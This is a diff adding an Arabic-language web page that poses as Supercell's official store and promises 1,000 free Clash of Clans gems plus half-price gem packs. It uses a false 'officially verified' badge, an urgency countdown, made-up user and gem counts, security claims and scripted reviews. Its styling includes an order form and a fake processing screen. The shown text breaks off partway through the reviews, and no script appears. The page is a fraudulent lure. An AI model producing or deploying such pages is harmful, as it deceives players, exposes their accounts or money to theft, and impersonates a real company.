@@ -1,0 +1,1614 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Supercell Store - الرسمي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Cairo:wght@400;600;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Cairo', 'Tajawal', sans-serif;
+        }
+        
+        :root {
+            --gold: #FFD700;
+            --gold-light: #FFF4B8;
+            --blue: #3B82F6;
+            --blue-dark: #1E40AF;
+            --dark: #0a0a0f;
+            --darker: #050508;
+            --card: #12121a;
+            --success: #10B981;
+            --supercell: #2D85C6;
+        }
+        
+        body {
+            background: var(--darker);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* خلفية سينمائية */
+        .cinematic-bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .gradient-orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: orb-float 20s infinite ease-in-out;
+        }
+        
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, var(--gold) 0%, transparent 70%);
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+        
+        .orb-2 {
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, var(--blue) 0%, transparent 70%);
+            bottom: 20%;
+            left: -100px;
+            animation-delay: 5s;
+        }
+        
+        .orb-3 {
+            width: 250px;
+            height: 250px;
+            background: radial-gradient(circle, #8B5CF6 0%, transparent 70%);
+            top: 40%;
+            right: -50px;
+            animation-delay: 10s;
+        }
+        
+        @keyframes orb-float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -30px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+        }
+        
+        /* شريط التنبيه العاجل */
+        .urgency-bar {
+            background: linear-gradient(90deg, #DC2626 0%, #991B1B 50%, #DC2626 100%);
+            background-size: 200% 100%;
+            animation: urgency-pulse 2s infinite;
+            padding: 10px;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 800;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        @keyframes urgency-pulse {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        
+        .urgency-dot {
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        /* الهيدر الفاخر */
+        .lux-header {
+            background: rgba(10, 10, 15, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,215,0,0.1);
+            padding: 15px 20px;
+            position: sticky;
+            top: 34px;
+            z-index: 999;
+        }
+        
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 100%;
+        }
+        
+        .supercell-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .sc-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--supercell) 0%, #1a5276 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .sc-logo::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+            animation: shine-logo 3s infinite;
+        }
+        
+        @keyframes shine-logo {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .sc-text h1 {
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            background: linear-gradient(90deg, #fff 0%, var(--gold) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .sc-text span {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            font-weight: 600;
+        }
+        
+        .verified-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid var(--success);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--success);
+        }
+        
+        .verified-badge i {
+            font-size: 14px;
+        }
+        
+        /* المحتوى */
+        .content {
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* البانر البطولي */
+        .hero-section {
+            text-align: center;
+            padding: 30px 0;
+            position: relative;
+        }
+        
+        .event-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(90deg, rgba(220, 38, 38, 0.2) 0%, rgba(220, 38, 38, 0.1) 100%);
+            border: 1px solid rgba(220, 38, 38, 0.5);
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 800;
+            margin-bottom: 25px;
+            color: #FCA5A5;
+            animation: float-badge 3s ease-in-out infinite;
+        }
+        
+        @keyframes float-badge {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        .main-title {
+            font-size: 32px;
+            font-weight: 900;
+            line-height: 1.3;
+            margin-bottom: 15px;
+            text-shadow: 0 0 40px rgba(255,215,0,0.3);
+        }
+        
+        .main-title .highlight {
+            background: linear-gradient(180deg, var(--gold) 0%, #FFA500 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+        }
+        
+        .main-title .highlight::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+            border-radius: 2px;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: rgba(255,255,255,0.7);
+            line-height: 1.8;
+            margin-bottom: 30px;
+            max-width: 90%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        /* عداد ضخم */
+        .mega-countdown {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+        
+        .time-unit {
+            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 20px;
+            padding: 20px 15px;
+            min-width: 80px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .time-unit::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+            opacity: 0.5;
+        }
+        
+        .time-number {
+            font-size: 42px;
+            font-weight: 900;
+            color: var(--gold);
+            display: block;
+            line-height: 1;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(255,215,0,0.3);
+        }
+        
+        .time-label {
+            font-size: 11px;
+            color: rgba(255,255,255,0.5);
+            margin-top: 5px;
+            font-weight: 600;
+        }
+        
+        /* شريط الثقة */
+        .trust-bar {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .trust-item {
+            text-align: center;
+        }
+        
+        .trust-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .trust-value {
+            font-size: 20px;
+            font-weight: 900;
+            color: var(--gold);
+            display: block;
+        }
+        
+        .trust-label {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        /* البطاقة الخارقة */
+        .super-card {
+            background: linear-gradient(135deg, rgba(255,215,0,0.1) 0%, rgba(255,215,0,0.02) 100%);
+            border: 2px solid rgba(255,215,0,0.3);
+            border-radius: 30px;
+            padding: 35px 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 60px rgba(255,215,0,0.1);
+        }
+        
+        .glow-effect {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(255,215,0,0.3) 0%, transparent 70%);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            animation: glow-pulse 3s infinite;
+        }
+        
+        @keyframes glow-pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.8; }
+        }
+        
+        .free-ribbon {
+            position: absolute;
+            top: 20px;
+            left: -35px;
+            background: linear-gradient(90deg, var(--success) 0%, #059669 100%);
+            padding: 8px 40px;
+            transform: rotate(-45deg);
+            font-size: 12px;
+            font-weight: 900;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+        }
+        
+        .gem-showcase {
+            position: relative;
+            z-index: 1;
+            margin: 30px 0;
+        }
+        
+        .gem-icon-main {
+            font-size: 100px;
+            filter: drop-shadow(0 0 30px rgba(255,215,0,0.6));
+            animation: gem-float 3s ease-in-out infinite;
+            display: inline-block;
+        }
+        
+        @keyframes gem-float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(10deg); }
+        }
+        
+        .amount-display {
+            font-size: 64px;
+            font-weight: 900;
+            background: linear-gradient(180deg, var(--gold-light) 0%, var(--gold) 50%, #B8860B 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 20px 0;
+            line-height: 1;
+            text-shadow: 0 10px 30px rgba(255,215,0,0.2);
+        }
+        
+        .amount-label {
+            font-size: 20px;
+            color: rgba(255,255,255,0.9);
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .feature-box {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .feature-box i {
+            color: var(--success);
+            font-size: 16px;
+        }
+        
+        .cta-super {
+            width: 100%;
+            max-width: 320px;
+            height: 64px;
+            background: linear-gradient(90deg, var(--success) 0%, #059669 50%, var(--success) 100%);
+            background-size: 200% 100%;
+            border: none;
+            border-radius: 16px;
+            color: white;
+            font-size: 20px;
+            font-weight: 900;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+            animation: cta-shine 3s infinite;
+            transition: transform 0.2s;
+        }
+        
+        @keyframes cta-shine {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .cta-super:active {
+            transform: scale(0.96);
+        }
+        
+        .cta-super::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.3) 50%, transparent 70%);
+            animation: btn-shine 2s infinite;
+        }
+        
+        @keyframes btn-shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        /* قسم الباقات */
+        .premium-zone {
+            margin-top: 40px;
+        }
+        
+        .section-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(90deg, rgba(139, 92, 246, 0.2) 0%, rgba(139, 92, 246, 0.1) 100%);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 800;
+            color: #C4B5FD;
+            margin-bottom: 25px;
+        }
+        
+        .packs-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .premium-pack {
+            background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 25px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .premium-pack:active {
+            transform: scale(0.98);
+        }
+        
+        .premium-pack.best {
+            border-color: var(--gold);
+            background: linear-gradient(135deg, rgba(255,215,0,0.1) 0%, rgba(255,215,0,0.02) 100%);
+        }
+        
+        .best-tag {
+            position: absolute;
+            top: 0;
+            right: 20px;
+            background: linear-gradient(180deg, var(--gold) 0%, #B8860B 100%);
+            color: var(--dark);
+            padding: 5px 15px;
+            border-radius: 0 0 10px 10px;
+            font-size: 10px;
+            font-weight: 900;
+        }
+        
+        .pack-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.2) 0%, rgba(255,215,0,0.05) 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            border: 2px solid rgba(255,215,0,0.3);
+            flex-shrink: 0;
+        }
+        
+        .pack-info {
+            flex: 1;
+        }
+        
+        .pack-name {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--gold);
+            margin-bottom: 5px;
+        }
+        
+        .pack-bonus {
+            font-size: 13px;
+            color: var(--success);
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .price-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .old-price-tag {
+            font-size: 14px;
+            color: #666;
+            text-decoration: line-through;
+        }
+        
+        .new-price-tag {
+            font-size: 26px;
+            font-weight: 900;
+            color: white;
+        }
+        
+        .buy-arrow {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark);
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        
+        /* التقييمات المتحركة */
+        .reviews-wall {
+            margin-top: 50px;
+            overflow: hidden;
+        }
+        
+        .reviews-track {
+            display: flex;
+            gap: 15px;
+            animation: scroll-reviews 20s linear infinite;
+            width: max-content;
+        }
+        
+        @keyframes scroll-reviews {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        
+        .review-card-float {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 20px;
+            width: 300px;
+            flex-shrink: 0;
+        }
+        
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .reviewer-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--gold), var(--supercell));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: var(--dark);
+        }
+        
+        .reviewer-info h4 {
+            font-size: 15px;
+            font-weight: 800;
+            margin-bottom: 3px;
+        }
+        
+        .review-stars {
+            color: var(--gold);
+            font-size: 12px;
+        }
+        
+        .review-text {
+            font-size: 13px;
+            color: rgba(255,255,255,0.8);
+            line-height: 1.7;
+        }
+        
+        /* النافذة المنبثقة */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 10000;
+            padding: 20px;
+            backdrop-filter: blur(30px);
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+            flex-direction: column;
+            animation: modal-in 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        @keyframes modal-in {
+            from { opacity: 0; transform: scale(0.9) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        
+        .modal-nav {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        
+        .close-btn {
+            width: 45px;
+            height: 45px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        .close-btn:active {
+            background: rgba(255,255,255,0.2);
+            transform: scale(0.95);
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 900;
+        }
+        
+        .security-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: var(--success);
+        }
+        
+        .selected-summary {
+            background: linear-gradient(135deg, rgba(255,215,0,0.15) 0%, rgba(255,215,0,0.05) 100%);
+            border: 2px solid rgba(255,215,0,0.3);
+            border-radius: 24px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .summary-glow {
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at center, rgba(255,215,0,0.2) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        
+        .summary-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .summary-amount {
+            font-size: 42px;
+            font-weight: 900;
+            color: var(--gold);
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .summary-type {
+            font-size: 16px;
+            color: rgba(255,255,255,0.8);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .form-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 64px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 0 20px 0 60px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: var(--gold);
+            background: rgba(255,255,255,0.08);
+            box-shadow: 0 0 0 4px rgba(255,215,0,0.1);
+        }
+        
+        .input-icon-left {
+            position: absolute;
+            left: 22px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gold);
+            font-size: 20px;
+        }
+        
+        .input-label {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255,255,255,0.4);
+            font-size: 15px;
+            pointer-events: none;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -10px;
+            right: 15px;
+            font-size: 12px;
+            color: var(--gold);
+            background: var(--dark);
+            padding: 0 8px;
+        }
+        
+        .security-banner {
+            background: linear-gradient(90deg, rgba(16, 185, 129, 0.1) 0%, rgba(16, 185, 129, 0.05) 100%);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .shield-icon {
+            width: 45px;
+            height: 45px;
+            background: rgba(16, 185, 129, 0.2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--success);
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        
+        .security-text h4 {
+            font-size: 14px;
+            font-weight: 800;
+            margin-bottom: 5px;
+            color: var(--success);
+        }
+        
+        .security-text p {
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+            line-height: 1.6;
+        }
+        
+        .submit-mega {
+            width: 100%;
+            height: 70px;
+            background: linear-gradient(90deg, var(--gold) 0%, #FFA500 100%);
+            border: none;
+            border-radius: 18px;
+            color: var(--dark);
+            font-size: 20px;
+            font-weight: 900;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 10px 40px rgba(255,215,0,0.3);
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-mega:active {
+            transform: scale(0.98);
+        }
+        
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(0,0,0,0.2);
+            border-top-color: var(--dark);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        /* شاشة المعالجة الاحترافية */
+        .process-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--darker);
+            z-index: 20000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .process-overlay.active {
+            display: flex;
+        }
+        
+        .process-visual {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            margin-bottom: 40px;
+        }
+        
+        .process-ring-svg {
+            position: absolute;
+            inset: 0;
+            transform: rotate(-90deg);
+        }
+        
+        .progress-circle {
+            fill: none;
+            stroke: rgba(255,255,255,0.1);
+            stroke-width: 8;
+        }
+        
+        .progress-circle-active {
+            fill: none;
+            stroke: url(#goldGradient);
+            stroke-width: 8;
+            stroke-linecap: round;
+            stroke-dasharray: 440;
+            stroke-dashoffset: 440;
+            transition: stroke-dashoffset 0.3s;
+        }
+        
+        .center-icon {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            filter: drop-shadow(0 0 20px rgba(255,215,0,0.5));
+        }
+        
+        .process-title {
+            font-size: 32px;
+            font-weight: 900;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, var(--gold) 0%, #fff 50%, var(--gold) 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: text-shine 3s linear infinite;
+        }
+        
+        @keyframes text-shine {
+            to { background-position: 200% center; }
+        }
+        
+        .process-desc {
+            font-size: 15px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 50px;
+            max-width: 300px;
+            line-height: 1.8;
+        }
+        
+        .steps-flow {
+            width: 100%;
+            max-width: 350px;
+        }
+        
+        .flow-step {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 12px;
+            opacity: 0.3;
+            transition: all 0.5s;
+            background: rgba(255,255,255,0.03);
+        }
+        
+        .flow-step.active {
+            opacity: 1;
+            background: rgba(255,215,0,0.1);
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        
+        .flow-step.completed {
+            opacity: 1;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+        
+        .step-number {
+            width: 45px;
+            height: 45px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 18px;
+            background: rgba(255,255,255,0.1);
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        
+        .flow-step.active .step-number {
+            background: var(--gold);
+            color: var(--dark);
+            box-shadow: 0 0 20px rgba(255,215,0,0.4);
+        }
+        
+        .flow-step.completed .step-number {
+            background: var(--success);
+            color: white;
+        }
+        
+        .flow-step.completed .step-number::after {
+            content: '✓';
+        }
+        
+        .flow-step.completed .step-number span {
+            display: none;
+        }
+        
+        .step-content h4 {
+            font-size: 16px;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+        
+        .step-content p {
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .percentage-display {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--gold);
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <svg width="0" height="0" style="position:absolute">
+        <defs>
+            <linearGradient id="goldGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" style="stop-color:#FFD700;stop-opacity:1" />
+                <stop offset="100%" style="stop-color:#FFA500;stop-opacity:1" />
+            </linearGradient>
+        </defs>
+    </svg>
+
+    <!-- خلفية سينمائية -->
+    <div class="cinematic-bg">
+        <div class="gradient-orb orb-1"></div>
+        <div class="gradient-orb orb-2"></div>
+        <div class="gradient-orb orb-3"></div>
+    </div>
+
+    <!-- شريط التنبيه -->
+    <div class="urgency-bar">
+        <div class="urgency-dot"></div>
+        🔥 العرض المجاني ينتهي خلال ساعات - آخر 47 طلب متاح فقط!
+    </div>
+
+    <!-- الهيدر -->
+    <header class="lux-header">
+        <div class="header-inner">
+            <div class="supercell-brand">
+                <div class="sc-logo">S</div>
+                <div class="sc-text">
+                    <h1>SUPERCELL</h1>
+                    <span>المتجر الرسمي</span>
+                </div>
+            </div>
+            <div class="verified-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>موثق رسمياً</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- المحتوى -->
+    <main class="content">
+
+        <!-- البانر البطولي -->
+        <section class="hero-section">
+            <div class="event-badge">
+                <i class="fas fa-crown"></i>
+                احتفال 10 سنوات Clash of Clans
+            </div>
+            
+            <h2 class="main-title">
+                احصل على <span class="highlight">1,000 جوهرة</span><br>
+                مجاناً 100% 🎁
+            </h2>
+            
+            <p class="subtitle">
+                بمناسبة عيد ميلاد اللعبة العاشر، سوبرسيل تقدم لك هدية مجانية لفترة محدودة. لا يحتاج بطاقة بنكية!
+            </p>
+
+            <!-- العداد -->
+            <div class="mega-countdown">
+                <div class="time-unit">
+                    <span class="time-number" id="hours">04</span>
+                    <span class="time-label">ساعة</span>
+                </div>
+                <div class="time-unit">
+                    <span class="time-number" id="minutes">52</span>
+                    <span class="time-label">دقيقة</span>
+                </div>
+                <div class="time-unit">
+                    <span class="time-number" id="seconds">37</span>
+                    <span class="time-label">ثانية</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- شريط الثقة -->
+        <div class="trust-bar">
+            <div class="trust-item">
+                <span class="trust-icon">👥</span>
+                <span class="trust-value">3.2M</span>
+                <span class="trust-label">مستفيد</span>
+            </div>
+            <div class="trust-item">
+                <span class="trust-icon">💎</span>
+                <span class="trust-value">1.2B</span>
+                <span class="trust-label">جوهرة موزعة</span>
+            </div>
+            <div class="trust-item">
+                <span class="trust-icon">⭐</span>
+                <span class="trust-value">4.9</span>
+                <span class="trust-label">تقييم التطبيق</span>
+            </div>
+        </div>
+
+        <!-- البطاقة الخارقة -->
+        <div class="super-card">
+            <div class="glow-effect"></div>
+            <div class="free-ribbon">مجاني 100%</div>
+            
+            <div class="gem-showcase">
+                <div class="gem-icon-main">💎</div>
+                <div class="amount-display">1,000</div>
+                <div class="amount-label">جوهرة مجانية</div>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-box">
+                    <i class="fas fa-bolt"></i>
+                    <span>تسليم فوري</span>
+                </div>
+                <div class="feature-box">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>حماية كاملة</span>
+                </div>
+                <div class="feature-box">
+                    <i class="fas fa-check-circle"></i>
+                    <span>بدون حظر</span>
+                </div>
+                <div class="feature-box">
+                    <i class="fas fa-lock"></i>
+                    <span>تشفير AES-256</span>
+                </div>
+            </div>
+
+            <button class="cta-super" onclick="openOrder(1000, 0, true)">
+                <i class="fas fa-gift"></i>
+                احصل على هديتك الآن
+            </button>
+        </div>
+
+        <!-- الباقات المدفوعة -->
+        <section class="premium-zone">
+            <div class="section-tag">
+                <i class="fas fa-gem"></i>
+                باقات الجواهر المخفضة
+            </div>
+
+            <div class="packs-container">
+                <div class="premium-pack" onclick="openOrder(2500, 4.99, false)">
+                    <div class="pack-icon">💎</div>
+                    <div class="pack-info">
+                        <div class="pack-name">2,500 جوهرة</div>
+                        <div class="pack-bonus">+250 هدية إضافية</div>
+                        <div class="price-row">
+                            <span class="old-price-tag">$9.99</span>
+                            <span class="new-price-tag">$4.99</span>
+                        </div>
+                    </div>
+                    <div class="buy-arrow">
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
+                </div>
+
+                <div class="premium-pack best" onclick="openOrder(6500, 9.99, false)">
+                    <div class="best-tag">الأكثر مبيعاً</div>
+                    <div class="pack-icon">💎</div>
+                    <div class="pack-info">
+                        <div class="pack-name">6,500 جوهرة</div>
+                        <div class="pack-bonus">+1,000 هدية إضافية</div>
+                        <div class="price-row">
+                            <span class="old-price-tag">$19.99</span>
+                            <span class="new-price-tag">$9.99</span>
+                        </div>
+                    </div>
+                    <div class="buy-arrow">
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
+                </div>
+
+                <div class="premium-pack" onclick="openOrder(14000, 19.99, false)">
+                    <div class="pack-icon">💎</div>
+                    <div class="pack-info">
+                        <div class="pack-name">14,000 جوهرة</div>
+                        <div class="pack-bonus">+2,500 هدية إضافية</div>
+                        <div class="price-row">
+                            <span class="old-price-tag">$39.99</span>
+                            <span class="new-price-tag">$19.99</span>
+                        </div>
+                    </div>
+                    <div class="buy-arrow">
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- التقييمات المتحركة -->
+        <div class="reviews-wall">
+            <div class="reviews-track">
+                <div class="review-card-float">
+                    <div class="review-header">
+                        <div class="reviewer-avatar">أح</div>
+                        <div class="reviewer-info">
+                            <h4>أحمد_المحترف</h4>
+                            <div class="review-stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
